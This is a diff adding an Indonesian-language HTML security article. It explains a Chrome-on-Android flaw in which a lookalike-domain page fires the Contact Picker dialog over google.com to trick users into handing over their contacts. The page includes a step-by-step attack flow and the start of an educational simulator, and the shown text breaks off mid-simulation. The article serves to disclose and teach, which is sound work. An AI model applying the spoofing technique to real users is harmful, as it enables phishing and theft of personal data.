@@ -1,0 +1,1540 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kerentanan Contact Picker API — Artikel Keamanan</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Lora:ital,wght@0,400;0,500;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --bg2: #141720;
+    --bg3: #1b1f2b;
+    --bg4: #222736;
+    --red: #e84040;
+    --red-dim: rgba(232,64,64,0.12);
+    --amber: #f0a030;
+    --amber-dim: rgba(240,160,48,0.10);
+    --green: #3eb87a;
+    --green-dim: rgba(62,184,122,0.10);
+    --blue: #4a9eff;
+    --blue-dim: rgba(74,158,255,0.10);
+    --text: #d8dbe8;
+    --text2: #8a90a8;
+    --text3: #555c78;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --mono: 'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
+    --body: 'Lora', Georgia, serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 17px;
+    line-height: 1.8;
+    min-height: 100vh;
+  }
+
+  /* ── HEADER ── */
+  .site-header {
+    border-bottom: 1px solid var(--border);
+    padding: 18px 0;
+  }
+  .site-header-inner {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .site-logo {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--text2);
+  }
+  .site-logo span { color: var(--red); }
+  .header-tag {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--text3);
+    border: 1px solid var(--border2);
+    padding: 4px 12px;
+    border-radius: 20px;
+  }
+
+  /* ── HERO ── */
+  .hero {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 80px 32px 64px;
+    position: relative;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse 60% 40% at 50% 0%, rgba(232,64,64,0.07) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-eyebrow {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+  .badge {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 4px 12px;
+    border-radius: 20px;
+  }
+  .badge-red { background: var(--red-dim); color: var(--red); border: 1px solid rgba(232,64,64,0.25); }
+  .badge-amber { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(240,160,48,0.25); }
+  .badge-green { background: var(--green-dim); color: var(--green); border: 1px solid rgba(62,184,122,0.25); }
+  .badge-blue { background: var(--blue-dim); color: var(--blue); border: 1px solid rgba(74,158,255,0.25); }
+
+  .hero h1 {
+    font-family: var(--display);
+    font-size: clamp(28px, 5vw, 48px);
+    font-weight: 800;
+    line-height: 1.15;
+    color: #f0f2fa;
+    margin-bottom: 20px;
+    letter-spacing: -0.01em;
+  }
+  .hero h1 em { color: var(--red); font-style: normal; }
+  .hero-lead {
+    font-size: 18px;
+    color: var(--text2);
+    max-width: 680px;
+    line-height: 1.7;
+    margin-bottom: 32px;
+  }
+  .hero-meta {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+  }
+  .meta-pill {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text3);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .meta-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--text3); }
+
+  /* ── CONTENT ── */
+  .content {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px 100px;
+  }
+
+  .section { margin-bottom: 64px; }
+
+  .section-label {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--red);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .section-label::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border2);
+  }
+
+  h2 {
+    font-family: var(--display);
+    font-size: 24px;
+    font-weight: 700;
+    color: #f0f2fa;
+    margin-bottom: 16px;
+    line-height: 1.3;
+  }
+
+  p { margin-bottom: 16px; color: var(--text); }
+
+  /* ── ATTACK FLOW ── */
+  .flow-grid {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 2px;
+    margin: 24px 0;
+  }
+  .flow-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .flow-step:first-child { border-radius: 12px 12px 0 0; }
+  .flow-step:last-child { border-radius: 0 0 12px 12px; }
+  .flow-step:hover { border-color: var(--border2); background: var(--bg3); }
+  .step-num {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 800;
+    min-width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .step-num-red { background: var(--red-dim); color: var(--red); }
+  .step-num-amber { background: var(--amber-dim); color: var(--amber); }
+  .step-body { flex: 1; }
+  .step-title {
+    font-family: var(--display);
+    font-size: 15px;
+    font-weight: 700;
+    color: #f0f2fa;
+    margin-bottom: 4px;
+  }
+  .step-desc { font-size: 14px; color: var(--text2); line-height: 1.6; }
+  .step-desc code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--bg4);
+    color: var(--amber);
+    padding: 1px 6px;
+    border-radius: 4px;
+  }
+
+  /* ── CALLOUT BOXES ── */
+  .callout {
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 24px 0;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+  .callout-red { background: var(--red-dim); border: 1px solid rgba(232,64,64,0.2); }
+  .callout-amber { background: var(--amber-dim); border: 1px solid rgba(240,160,48,0.2); }
+  .callout-green { background: var(--green-dim); border: 1px solid rgba(62,184,122,0.2); }
+  .callout-blue { background: var(--blue-dim); border: 1px solid rgba(74,158,255,0.2); }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 2px; }
+  .callout-body { flex: 1; }
+  .callout-title { font-family: var(--display); font-size: 13px; font-weight: 700; margin-bottom: 4px; }
+  .callout-red .callout-title { color: var(--red); }
+  .callout-amber .callout-title { color: var(--amber); }
+  .callout-green .callout-title { color: var(--green); }
+  .callout-blue .callout-title { color: var(--blue); }
+  .callout p { font-size: 14px; margin: 0; line-height: 1.65; }
+
+  /* ── CODE BLOCK ── */
+  .code-wrap {
+    background: #0a0c11;
+    border: 1px solid var(--border2);
+    border-radius: 12px;
+    overflow: hidden;
+    margin: 24px 0;
+    font-family: var(--mono);
+  }
+  .code-bar {
+    background: var(--bg3);
+    padding: 10px 18px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+  .code-dots { display: flex; gap: 6px; }
+  .cd { width: 10px; height: 10px; border-radius: 50%; }
+  .cd-r { background: #e84040; }
+  .cd-y { background: #f0a030; }
+  .cd-g { background: #3eb87a; }
+  .code-filename {
+    font-size: 12px;
+    color: var(--text3);
+    font-weight: 500;
+  }
+  pre {
+    padding: 20px 22px;
+    font-size: 13px;
+    line-height: 1.9;
+    overflow-x: auto;
+    tab-size: 2;
+  }
+  .kw { color: #c792ea; }
+  .fn { color: #82aaff; }
+  .str { color: #c3e88d; }
+  .cmt { color: #546e7a; font-style: italic; }
+  .hl { background: rgba(232,64,64,0.15); border-left: 2px solid var(--red); padding-left: 6px; margin-left: -8px; display: block; }
+  .hl-amber { background: rgba(240,160,48,0.12); border-left: 2px solid var(--amber); padding-left: 6px; margin-left: -8px; display: block; }
+  .tag { color: #f07178; }
+  .attr { color: #ffcb6b; }
+
+  /* ── ANNOTATION LIST ── */
+  .ann-list { display: flex; flex-direction: column; gap: 12px; margin: 20px 0; }
+  .ann {
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+    padding: 14px 18px;
+    border-radius: 10px;
+    border: 1px solid transparent;
+  }
+  .ann-red-bg { background: var(--red-dim); border-color: rgba(232,64,64,0.2); }
+  .ann-amber-bg { background: var(--amber-dim); border-color: rgba(240,160,48,0.2); }
+  .ann-blue-bg { background: var(--blue-dim); border-color: rgba(74,158,255,0.2); }
+  .ann-letter {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 800;
+    min-width: 26px;
+    height: 26px;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .ann-red-bg .ann-letter { background: rgba(232,64,64,0.25); color: var(--red); }
+  .ann-amber-bg .ann-letter { background: rgba(240,160,48,0.25); color: var(--amber); }
+  .ann-blue-bg .ann-letter { background: rgba(74,158,255,0.25); color: var(--blue); }
+  .ann-content { flex: 1; }
+  .ann-head { font-family: var(--display); font-size: 13px; font-weight: 700; margin-bottom: 4px; }
+  .ann-red-bg .ann-head { color: var(--red); }
+  .ann-amber-bg .ann-head { color: var(--amber); }
+  .ann-blue-bg .ann-head { color: var(--blue); }
+  .ann p { font-size: 13px; color: var(--text2); margin: 0; line-height: 1.65; }
+  .ann code { font-family: var(--mono); font-size: 11.5px; background: var(--bg4); color: var(--amber); padding: 1px 5px; border-radius: 3px; }
+
+  /* ── DATA TABLE ── */
+  .data-table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px; }
+  .data-table th {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--text3);
+    text-align: left;
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border2);
+  }
+  .data-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    vertical-align: top;
+  }
+  .data-table td:first-child { color: #f0f2fa; font-weight: 500; }
+  .data-table tr:last-child td { border-bottom: none; }
+  .data-table-wrap { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin: 20px 0; }
+
+  /* ── TIPS GRID ── */
+  .tips-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
+  @media (max-width: 600px) { .tips-grid { grid-template-columns: 1fr; } }
+  .tip-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px;
+    transition: border-color 0.2s;
+  }
+  .tip-card:hover { border-color: var(--border2); }
+  .tip-icon { font-size: 22px; margin-bottom: 10px; }
+  .tip-title { font-family: var(--display); font-size: 14px; font-weight: 700; color: #f0f2fa; margin-bottom: 6px; }
+  .tip-text { font-size: 13px; color: var(--text2); line-height: 1.6; }
+
+  /* ── DIVIDER ── */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+  /* ══════════════════════════════════════
+     INTERACTIVE PoC SIMULATOR
+  ══════════════════════════════════════ */
+  .poc-section {
+    background: var(--bg2);
+    border: 1px solid var(--border2);
+    border-radius: 16px;
+    overflow: hidden;
+    margin: 24px 0;
+  }
+  .poc-header {
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border2);
+    padding: 14px 22px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .poc-title {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--amber);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .poc-title::before {
+    content: '';
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--amber);
+    animation: blink 1.4s ease-in-out infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+  .poc-warning {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--red);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+  }
+  .poc-body { padding: 24px; }
+
+  /* Steps indicator */
+  .poc-steps {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin-bottom: 28px;
+    overflow-x: auto;
+    padding-bottom: 4px;
+  }
+  .poc-step-item {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    flex-shrink: 0;
+  }
+  .poc-step-btn {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 700;
+    padding: 6px 14px;
+    border-radius: 20px;
+    border: 1px solid var(--border2);
+    background: transparent;
+    color: var(--text3);
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+  .poc-step-btn.active {
+    background: var(--red);
+    border-color: var(--red);
+    color: #fff;
+  }
+  .poc-step-btn.done {
+    background: var(--bg4);
+    border-color: var(--border2);
+    color: var(--text2);
+  }
+  .poc-connector {
+    width: 24px;
+    height: 1px;
+    background: var(--border2);
+    flex-shrink: 0;
+  }
+
+  /* Sim screen */
+  .sim-area {
+    position: relative;
+    min-height: 380px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  /* Phone frame */
+  .phone-frame {
+    width: 220px;
+    background: #111;
+    border-radius: 36px;
+    border: 6px solid #2a2a2a;
+    box-shadow: 0 0 0 1px #3a3a3a, 0 32px 60px rgba(0,0,0,0.6);
+    overflow: hidden;
+    position: relative;
+  }
+  .phone-notch {
+    background: #111;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .phone-notch-pill {
+    width: 60px;
+    height: 10px;
+    background: #1e1e1e;
+    border-radius: 10px;
+  }
+  .phone-screen {
+    min-height: 300px;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    background: #fff;
+  }
+  .phone-status {
+    background: #f8f8f8;
+    padding: 4px 12px;
+    display: flex;
+    justify-content: space-between;
+    font-size: 9px;
+    font-family: var(--mono);
+    color: #666;
+  }
+  .browser-bar {
+    background: #f1f3f4;
+    padding: 6px 10px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    border-bottom: 1px solid #e0e0e0;
+  }
+  .url-box {
+    flex: 1;
+    background: #fff;
+    border-radius: 12px;
+    padding: 3px 8px;
+    font-size: 9px;
+    font-family: var(--mono);
+    color: #555;
+    border: 1px solid #ddd;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .url-box.malicious { color: #c00; }
+  .page-content {
+    flex: 1;
+    padding: 16px 12px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    color: #222;
+    font-family: sans-serif;
+  }
+  .page-title-sm { font-size: 11px; font-weight: 700; margin-bottom: 6px; color: #111; }
+  .page-sub-sm { font-size: 9px; color: #777; line-height: 1.5; }
+
+  /* Google fake page */
+  .google-page { background: #fff; }
+  .google-logo-fake { font-size: 28px; font-weight: 700; letter-spacing: -1px; margin-bottom: 8px; }
+  .google-logo-fake span:nth-child(1){ color:#4285F4; }
+  .google-logo-fake span:nth-child(2){ color:#EA4335; }
+  .google-logo-fake span:nth-child(3){ color:#FBBC05; }
+  .google-logo-fake span:nth-child(4){ color:#4285F4; }
+  .google-logo-fake span:nth-child(5){ color:#34A853; }
+  .google-logo-fake span:nth-child(6){ color:#EA4335; }
+  .google-search-bar {
+    background: #f1f3f4;
+    border-radius: 20px;
+    padding: 6px 12px;
+    font-size: 9px;
+    color: #aaa;
+    width: 100%;
+    margin-bottom: 8px;
+    text-align: left;
+  }
+
+  /* Dialog overlay */
+  .dialog-overlay {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    background: rgba(0,0,0,0.5);
+    border-radius: 0 0 28px 28px;
+    display: flex;
+    align-items: flex-end;
+    transition: opacity 0.35s;
+  }
+  .dialog-box {
+    background: #fff;
+    width: 100%;
+    border-radius: 16px 16px 0 0;
+    padding: 14px;
+    box-shadow: 0 -4px 24px rgba(0,0,0,0.18);
+  }
+  .dialog-handle {
+    width: 32px; height: 3px;
+    background: #ddd;
+    border-radius: 2px;
+    margin: 0 auto 10px;
+  }
+  .dialog-origin-text {
+    font-size: 8px;
+    font-family: var(--mono);
+    color: #888;
+    background: #f5f5f5;
+    padding: 3px 7px;
+    border-radius: 4px;
+    margin-bottom: 8px;
+    word-break: break-all;
+  }
+  .dialog-heading {
+    font-size: 10px;
+    font-weight: 700;
+    color: #111;
+    margin-bottom: 8px;
+    line-height: 1.3;
+  }
+  .contact-item {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    background: #f8f8f8;
+    border-radius: 8px;
+    padding: 5px 8px;
+    margin-bottom: 4px;
+    font-size: 9px;
+    color: #333;
+  }
+  .contact-avatar {
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 8px;
+    font-weight: 700;
+    flex-shrink: 0;
+    color: #fff;
+  }
+  .contact-info { line-height: 1.4; }
+  .contact-name { font-weight: 600; color: #111; }
+  .contact-detail { font-size: 8px; color: #888; }
+  .dialog-check {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 8px;
+    color: #555;
+    margin: 4px 0 8px;
+  }
+  .check-box {
+    width: 12px; height: 12px;
+    background: #1a73e8;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 8px;
+    color: #fff;
+  }
+  .dialog-btns { display: flex; gap: 6px; }
+  .dbtn {
+    flex: 1;
+    padding: 7px;
+    border-radius: 8px;
+    font-size: 9px;
+    font-weight: 700;
+    border: none;
+    cursor: pointer;
+    transition: opacity 0.15s;
+  }
+  .dbtn:hover { opacity: 0.85; }
+  .dbtn-deny { background: #f0f0f0; color: #444; }
+  .dbtn-allow { background: #1a73e8; color: #fff; }
+
+  /* Server terminal */
+  .server-terminal {
+    background: #0d1117;
+    border: 1px solid #2a2a2a;
+    border-radius: 12px;
+    padding: 16px 18px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.8;
+    min-width: 240px;
+    min-height: 160px;
+  }
+  .t-dim { color: #555; }
+  .t-green { color: #3eb87a; }
+  .t-yellow { color: #f0a030; }
+  .t-red { color: #e84040; }
+  .t-cyan { color: #4a9eff; }
+  .t-white { color: #e0e0e0; }
+
+  /* Sim layout */
+  .sim-layout {
+    display: flex;
+    gap: 24px;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+  .sim-right { display: flex; flex-direction: column; gap: 14px; min-width: 220px; }
+
+  /* State label */
+  .state-label {
+    text-align: center;
+    margin-top: 16px;
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text3);
+  }
+
+  /* Explanation box */
+  .explain-box {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px 16px;
+  }
+  .explain-box p { font-size: 13px; color: var(--text2); margin: 0; line-height: 1.65; }
+  .explain-box strong { color: #f0f2fa; font-style: normal; }
+  .explain-box code { font-family: var(--mono); font-size: 11.5px; background: var(--bg4); color: var(--amber); padding: 1px 5px; border-radius: 3px; }
+
+  /* Buttons nav */
+  .sim-nav { display: flex; justify-content: space-between; margin-top: 20px; gap: 10px; }
+  .nav-btn {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    padding: 10px 22px;
+    border-radius: 10px;
+    border: 1px solid var(--border2);
+    background: var(--bg3);
+    color: var(--text);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .nav-btn:hover { background: var(--bg4); border-color: var(--text3); }
+  .nav-btn.primary {
+    background: var(--red);
+    border-color: var(--red);
+    color: #fff;
+  }
+  .nav-btn.primary:hover { background: #c83030; }
+  .nav-btn:disabled { opacity: 0.35; cursor: not-allowed; }
+  .nav-btn.success { background: var(--green); border-color: var(--green); color: #fff; }
+  .nav-btn.success:hover { background: #2f9660; }
+
+  /* Hidden state management */
+  .sim-state { display: none; }
+  .sim-state.active { display: flex; }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px;
+    max-width: 900px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  footer p { font-size: 13px; color: var(--text3); margin: 0; }
+  .footer-ref {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--blue);
+    text-decoration: none;
+  }
+  .footer-ref:hover { text-decoration: underline; }
+
+  /* Scroll reveal (simple) */
+  @keyframes fadeUp { from { opacity:0; transform:translateY(18px); } to { opacity:1; transform:translateY(0); } }
+  .section { animation: fadeUp 0.5s ease both; }
+
+  /* Attacker arrow */
+  .arrow-label {
+    font-family: var(--display);
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--red);
+    text-align: center;
+    padding: 6px 0;
+  }
+
+  .leaked-line {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 4px 0;
+  }
+  .leaked-key { color: #4a9eff; min-width: 60px; }
+  .leaked-val { color: #3eb87a; }
+
+  @media (max-width: 680px) {
+    .hero { padding: 48px 20px 40px; }
+    .content { padding: 0 20px 60px; }
+    .tips-grid { grid-template-columns: 1fr; }
+    .sim-layout { flex-direction: column; align-items: center; }
+    .sim-right { min-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="site-header-inner">
+    <div class="site-logo">Sec<span>Research</span></div>
+    <div class="header-tag">Vulnerability Report</div>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-eyebrow">
+    <span class="badge badge-red">Kerentanan Kritis</span>
+    <span class="badge badge-amber">Chrome Android</span>
+    <span class="badge badge-blue">Contact Picker API</span>
+  </div>
+  <h1>Ketika Daftar Kontakmu Bisa Dicuri <em>Hanya dengan Sekali Klik</em></h1>
+  <p class="hero-lead">
+    Sebuah kerentanan pada Chrome di Android memungkinkan penyerang mencuri nama,
+    nomor HP, dan email dari buku kontak kamu — dengan menipu kamu agar mengira
+    kamu sedang memberi izin ke situs tepercaya seperti Google.
+  </p>
+  <div class="hero-meta">
+    <span class="meta-pill"><span class="meta-dot"></span> UI Spoofing Attack</span>
+    <span class="meta-pill"><span class="meta-dot"></span> Chromium Bug #40057597</span>
+    <span class="meta-pill"><span class="meta-dot"></span> Chrome Android</span>
+  </div>
+</section>
+
+<!-- CONTENT -->
+<div class="content">
+
+  <!-- SECTION 1: Apa itu Contact Picker API -->
+  <section class="section">
+    <div class="section-label">01 — Latar Belakang</div>
+    <h2>Apa itu Contact Picker API?</h2>
+    <p>
+      Browser modern punya fitur bernama <strong>Contact Picker API</strong> — sebuah cara resmi bagi website
+      untuk meminta pengguna memilih kontak dari buku telepon mereka. Fitur ini berguna, misalnya
+      saat kamu ingin mengundang teman ke suatu aplikasi.
+    </p>
+    <p>
+      Cara kerjanya: website memanggil <code style="font-family:var(--mono);font-size:13px;background:var(--bg3);color:var(--amber);padding:2px 7px;border-radius:4px;">navigator.contacts.select()</code>,
+      browser menampilkan dialog resmi yang meminta kamu memilih kontak, lalu data yang dipilih
+      dikembalikan ke website. Terlihat aman, bukan?
+    </p>
+    <p>
+      Masalahnya: fitur ini bisa <strong>disalahgunakan</strong> dengan trik yang disebut
+      <em>UI Spoofing</em> — membuat dialog izin muncul di atas halaman situs lain yang tidak ada
+      hubungannya, sehingga kamu mengira situs tepercaya itulah yang meminta izin.
+    </p>
+
+    <div class="callout callout-amber">
+      <div class="callout-icon">⚠️</div>
+      <div class="callout-body">
+        <div class="callout-title">Penting dipahami</div>
+        <p>Dialog izin Chrome memang menampilkan nama situs asli (penyerang). Tapi teks kecil itu mudah terlewat ketika kamu sudah terlanjur fokus melihat halaman Google di belakangnya. Inilah inti dari serangan ini.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 2: Alur Serangan -->
+  <section class="section">
+    <div class="section-label">02 — Mekanisme Serangan</div>
+    <h2>Bagaimana Serangan Ini Bekerja?</h2>
+    <p>Serangan ini memanfaatkan celah: Chrome tidak menutup dialog kontak ketika navigasi lintas-origin terjadi bersamaan. Hasilnya, dialog milik situs penyerang tampil di atas halaman tepercaya.</p>
+
+    <div class="flow-grid">
+      <div class="flow-step">
+        <div class="step-num step-num-red">01</div>
+        <div class="step-body">
+          <div class="step-title">Korban mengunjungi situs jebakan</div>
+          <div class="step-desc">Bisa berupa domain lookalike seperti <code>g00gle-login.com</code> atau situs phishing biasa. Halaman terlihat biasa — mungkin loading screen atau halaman kosong.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-num step-num-red">02</div>
+        <div class="step-body">
+          <div class="step-title">Korban mengklik di mana saja</div>
+          <div class="step-desc">Satu klik di mana saja sudah cukup. Kode penyerang menggunakan <code>onclick</code> global yang terpasang ke seluruh halaman — tidak perlu tombol khusus.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-num step-num-red">03</div>
+        <div class="step-body">
+          <div class="step-title">Dua aksi dijalankan bersamaan</div>
+          <div class="step-desc">Situs penyerang memanggil <code>navigator.contacts.select()</code> dan sekaligus membuka <code>google.com</code> di jendela baru. Keduanya terjadi hampir bersamaan karena fungsi async tidak ditunggu.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-num step-num-red">04</div>
+        <div class="step-body">
+          <div class="step-title">Dialog kontak muncul di atas Google</div>
+          <div class="step-desc">Chrome tidak menutup dialog ketika Google terbuka. Akibatnya dialog kontak milik penyerang tampil persis di atas halaman Google — menciptakan ilusi bahwa Google yang meminta izin.</div>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="step-num step-num-amber">05</div>
+        <div class="step-body">
+          <div class="step-title">Korban menekan "Izinkan" dan memilih kontak</div>
+          <div class="step-desc">Karena mengira itu permintaan Google, korban memilih beberapa kontak dan menekan Allow. Semua data (nama, telepon, email) langsung dikirim ke server penyerang.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 3: PoC Interaktif -->
+  <section class="section">
+    <div class="section-label">03 — Proof of Concept (Simulasi)</div>
+    <h2>Simulasi Serangan Interaktif</h2>
+    <p>
+      Ikuti simulasi langkah demi langkah berikut untuk memahami bagaimana serangan ini terjadi
+      dari sudut pandang korban dan penyerang. <em>Ini adalah simulasi edukasi — tidak ada data asli yang diakses.</em>
+    </p>
+
+    <div class="poc-section">
+      <div class="poc-header">
+        <div class="poc-title">PoC Simulator — Contact Picker Spoofing</div>
+        <div class="poc-warning">⚠ Edukasi saja</div>
+      </div>
+      <div class="poc-body">
+
+        <!-- Steps indicator -->
+        <div class="poc-steps" id="stepIndicator">
+          <div class="poc-step-item">
+            <button class="poc-step-btn active" onclick="goStep(1)">1. Situs Jebakan</button>
+          </div>
+          <div class="poc-connector"></div>
+          <div class="poc-step-item">
+            <button class="poc-step-btn" onclick="goStep(2)">2. Klik</button>
+          </div>
+          <div class="poc-connector"></div>
+          <div class="poc-step-item">
+            <button class="poc-step-btn" onclick="goStep(3)">3. Dialog Muncul</button>
+          </div>
+          <div class="poc-connector"></div>
+          <div class="poc-step-item">
+            <button class="poc-step-btn" onclick="goStep(4)">4. Data Bocor</button>
+          </div>
+          <div class="poc-connector"></div>
+          <div class="poc-step-item">
+            <button class="poc-step-btn" onclick="goStep(5)">5. Server Penyerang</button>
+          </div>
+        </div>
+
+        <!-- STEP 1: Halaman jebakan -->
+        <div class="sim-area sim-state active" id="state1">
+          <div class="sim-layout">
+            <div>
+              <div class="phone-frame">
+                <div class="phone-notch"><div class="phone-notch-pill"></div></div>
+                <div class="phone-screen">
+                  <div class="phone-status"><span>9:41</span><span>●●● 100%</span></div>
+                  <div class="browser-bar">
+                    <div class="url-box malicious">g00gle-login.com</div>
+                  </div>
+                  <div class="page-content">
+                    <div style="font-size:32px;margin-bottom:12px;">🔄</div>
+                    <div class="page-title-sm">Memuat halaman...</div>
+                    <div class="page-sub-sm">Mohon tunggu sebentar</div>
+                    <div style="margin-top:20px;font-size:9px;color:#bbb;font-style:italic;">
+                      Klik di mana saja untuk melanjutkan
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="state-label">👁 Tampilan dari sisi korban</div>
+            </div>
+            <div class="sim-right">
+              <div class="explain-box">
+                <p>
+                  <strong>Langkah 1: Situs Jebakan</strong><br><br>
+                  Korban mengunjungi <code>g00gle-login.com</code> — domain yang mirip Google tapi berbeda.
+                  Halaman terlihat seperti loading screen biasa. Tidak ada yang mencurigakan.<br><br>
+                  Di balik layar, kode berbahaya sudah terpasang dan menunggu satu klik dari pengguna.
+                </p>
+              </div>
+              <div class="code-wrap" style="margin:0">
+                <div class="code-bar">
+                  <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+                  <div class="code-filename">script menunggu klik</div>
+                </div>
+                <pre style="padding:14px 16px;font-size:11.5px;"><span class="cmt">// terpasang ke seluruh halaman</span>
+<span class="kw">window</span>.<span class="fn">onclick</span> = <span class="kw">async</span> () => {
+  <span class="cmt">// siap dijalankan...</span>
+};</pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 2: Klik -->
+        <div class="sim-area sim-state" id="state2">
+          <div class="sim-layout">
+            <div>
+              <div class="phone-frame">
+                <div class="phone-notch"><div class="phone-notch-pill"></div></div>
+                <div class="phone-screen">
+                  <div class="phone-status"><span>9:41</span><span>●●● 100%</span></div>
